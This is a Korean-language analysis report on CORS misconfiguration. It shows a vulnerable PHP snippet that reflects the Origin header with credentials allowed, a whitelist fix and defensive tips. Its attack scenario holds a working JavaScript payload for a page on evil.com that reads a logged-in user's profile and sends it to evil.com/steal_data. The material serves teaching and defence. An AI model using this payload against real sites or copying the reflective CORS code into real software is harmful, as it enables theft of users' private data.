# CORS Misconfiguration (CORS 설정 오류) 분석 보고서

## 1. CORS 란?

**교차 출처 공격에 문을 열어주다**

- **CORS란?** Cross-Origin Resource Sharing의 약자로, 웹 브라우저가 한 도메인(Origin)에서 다른 도메인의 리소스에 접근할 수 있도록 허용하는 보안 메커니즘입니다. 기본적으로 브라우저는 동일 출처 정책(Same-Origin Policy, SOP)에 따라 다른 도메인으로의 요청을 차단합니다. CORS는 이 SOP를 안전하게 완화하는 방법입니다.
- **원리:** 브라우저가 교차 출처 요청을 보낼 때 `Origin` 헤더를 포함합니다. 서버는 `Access-Control-Allow-Origin` 등의 CORS 관련 헤더를 응답에 포함하여, 해당 `Origin`으로부터의 요청을 허용할지 브라우저에게 알려줍니다.
- **영향:** 잘못 설정된 CORS 정책은 브라우저의 보안 메커니즘을 우회하여, 악의적인 웹사이트가 사용자의 브라우저를 통해 취약한 애플리케이션에 무단으로 요청을 보내고 민감한 데이터를 탈취하거나 조작하는 것을 허용할 수 있습니다.

---

## 2. 취약한 코드 분석 (예시)

**문제의 핵심: Origin 헤더를 검증 없이 그대로 반사**

```php
// 취약한 CORS 설정
// 이 코드는 요청의 Origin 헤더를 검증 없이 그대로 Access-Control-Allow-Origin에 반영합니다.
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if (!empty($origin)) {
    header("Access-Control-Allow-Origin: " . $origin);
    header("Access-Control-Allow-Credentials: true"); // 자격 증명(쿠키 등) 허용
}
```

**핵심 문제점:** `Access-Control-Allow-Origin` 헤더에 요청의 `Origin` 값을 그대로 반사하는 것은 매우 위험합니다. 이는 공격자가 자신의 악성 도메인을 `Origin`으로 설정하여 요청을 보내면, 서버가 이를 허용하게 만들기 때문입니다.

---

## 3. 공격 시나리오: 민감 데이터 탈취

**공격 목표:** 취약한 API로부터 사용자의 민감한 프로필 데이터 탈취하기

**공격자가 만든 악성 웹사이트 (`evil.com`):**

```html
<script>
fetch('https://vulnerable-api.com/user/profile', {
    method: 'GET',
    credentials: 'include' // 이 옵션으로 사용자의 쿠키가 요청에 포함됩니다.
})
.then(response => response.json())
.then(data => {
    // 탈취한 데이터를 공격자의 서버로 전송
    fetch('https://evil.com/steal_data', {
        method: 'POST',
        body: JSON.stringify(data)
    });
})
.catch(error => console.error('에러:', error));
</script>
```

**공격 과정:**
1.  사용자는 `vulnerable-api.com`에 로그인되어 있는 상태입니다.
2.  사용자가 `evil.com` 웹사이트를 방문합니다.
3.  `evil.com`의 JavaScript 코드가 `vulnerable-api.com/user/profile`로 `fetch` 요청을 보냅니다. 이때 `credentials: 'include'` 옵션으로 사용자의 세션 쿠키가 자동으로 요청에 포함됩니다.
4.  `vulnerable-api.com`은 `Origin: evil.com` 헤더를 받고, 이를 `Access-Control-Allow-Origin: evil.com`으로 반사하여 응답합니다. 또한 `Access-Control-Allow-Credentials: true`도 설정되어 있습니다.
5.  브라우저는 이 응답을 보고 `evil.com`이 `vulnerable-api.com`의 리소스에 접근하는 것을 허용합니다.
6.  `evil.com`은 사용자의 프로필 데이터를 성공적으로 받아와, 이를 공격자의 서버로 전송하여 데이터를 탈취합니다.

---

## 4. 해결책: 엄격한 화이트리스트 기반 설정

**가장 안전한 방법: 신뢰할 수 있는 특정 Origin만 명시적으로 허용하기**

```php
// 허용할 Origin 목록을 엄격하게 정의합니다.
$allowed_origins = [
    'https://your-frontend-app.com',
    'https://your-mobile-app.com'
];

// 요청의 Origin 헤더를 가져옵니다.
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

// 요청 Origin이 허용된 목록에 있는지 확인합니다.
if (in_array($origin, $allowed_origins)) {
    // 신뢰할 수 있는 Origin인 경우에만 CORS 헤더를 설정합니다.
    header("Access-Control-Allow-Origin: " . $origin);
    header("Access-Control-Allow-Credentials: true"); // 자격 증명 허용
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS"); // 허용할 HTTP 메소드
    header("Access-Control-Allow-Headers: Content-Type, Authorization"); // 허용할 헤더
} else {
    // 신뢰할 수 없는 Origin인 경우 CORS 헤더를 설정하지 않습니다.
    // 브라우저의 동일 출처 정책(SOP)에 의해 요청이 차단됩니다.
}
```

**작동 원리:** 이 방식은 오직 명시적으로 허용된 도메인에서 온 요청만 리소스에 접근할 수 있도록 합니다. 다른 모든 교차 출처 요청은 브라우저의 Same-Origin Policy에 의해 자동으로 차단됩니다.

---

## 5. CORS 설정 오류 방어 전략

1.  **엄격한 Origin 화이트리스트 사용 (필수):** `Access-Control-Allow-Origin` 헤더에는 신뢰할 수 있는 특정 도메인만 명시적으로 허용합니다. 동적으로 `Origin` 헤더를 반사하는 것은 피해야 합니다.
2.  **와일드카드(`*`)와 자격 증명(`credentials: true`) 동시 사용 금지:** `Access-Control-Allow-Origin: *`와 `Access-Control-Allow-Credentials: true`를 함께 사용하는 것은 매우 위험한 설정입니다.
3.  **Null Origin 요청 거부:** `Origin: null` 헤더를 가진 요청은 특별한 이유가 없다면 명시적으로 거부합니다.
4.  **Origin 헤더 검증 강화:** 정규식 등을 사용하여 `Origin` 헤더를 검증할 경우, 공격자가 제어하는 서브도메인이나 유사 도메인이 허용되지 않도록 정규식을 견고하게 작성합니다.
5.  **허용할 HTTP 메소드 및 헤더 제한:** `Access-Control-Allow-Methods` 및 `Access-Control-Allow-Headers`를 사용하여 필요한 최소한의 메소드와 헤더만 허용합니다.
